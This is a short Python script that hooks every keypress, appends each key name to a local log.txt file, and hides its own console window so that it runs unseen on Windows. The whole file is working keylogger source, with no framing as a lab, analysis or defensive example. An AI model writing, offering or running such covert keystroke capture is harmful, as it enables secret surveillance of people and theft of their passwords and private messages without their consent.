import keyboard
import sys
import ctypes


def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden")

def on_key_press(event):
    with open('log.txt', 'a') as f:
        f.write(event.name)

keyboard.on_press(on_key_press)

hide_console()

keyboard.wait()